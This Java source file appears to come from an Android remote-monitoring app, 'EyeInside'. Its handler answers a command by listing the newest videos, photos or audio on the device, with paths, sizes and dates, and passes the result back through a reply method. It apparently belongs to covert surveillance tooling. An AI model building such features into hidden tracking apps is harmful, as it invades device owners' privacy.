package com.code4bones.EyeInside;

import java.text.SimpleDateFormat;

import com.code4bones.utils.NetLog;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.provider.MediaStore;

public class handleMedia extends Handler {

	public static final int VIDEO = 0;
	public static final int IMAGE = 1;
	public static final int AUDIO = 2;
	
	
	public Context mContext = null;
	public int mType = 0;
	final public SimpleDateFormat df = new SimpleDateFormat("dd-MM-yyyy' 'HH:mm:ss");
	final static Uri mUris[] = new Uri[]{MediaStore.Video.Media.EXTERNAL_CONTENT_URI,MediaStore.Images.Media.EXTERNAL_CONTENT_URI,MediaStore.Audio.Media.EXTERNAL_CONTENT_URI};
	final static String mTypeNames[] = new String[]{"Видео","Фото","Аудио"};
	final static  String mColumnData[] = new String[]{MediaStore.Video.VideoColumns.DATA,MediaStore.Images.ImageColumns.DATA,MediaStore.Audio.AudioColumns.DATA};
	final static  String mColumnSize[] = new String[]{MediaStore.Video.VideoColumns.SIZE,MediaStore.Images.ImageColumns.SIZE,MediaStore.Audio.AudioColumns.SIZE};
	final static  String mColumnDisp[] = new String[]{MediaStore.Video.VideoColumns.DISPLAY_NAME,MediaStore.Images.ImageColumns.DISPLAY_NAME,MediaStore.Audio.AudioColumns.DISPLAY_NAME};
	final static  String mColumnDate[] = new String[]{MediaStore.Video.VideoColumns.DATE_TAKEN,MediaStore.Images.ImageColumns.DATE_TAKEN,MediaStore.Audio.AudioColumns.DATE_ADDED};

	
	public handleMedia(Context context,int type) {
		mContext = context;
		mType = type;
	}

	
	public void handleMessage(Message msg) {
		
		CommandObj cmd = (CommandObj) msg.obj;
	   
		cmd.mAction = mUris[mType].toString();
		cmd.mWhat = mType;
	   
		Cursor cur = mContext.getContentResolver().query(mUris[mType], null,null, null,"_id desc");
		if  (cur == null || !cur.moveToFirst() ) {
       		NetLog.e("SMS Cursor null");
    	   return;
		}
       try {
    	   Integer Type = Integer.valueOf(mType);
    	   cmd.Reply(cur,mUris[mType].toString(),Type);
    	   cur.close();
       } catch (Exception e) {
		// TODO Auto-generated catch block
    	   e.printStackTrace();
       }
 	}
	
}

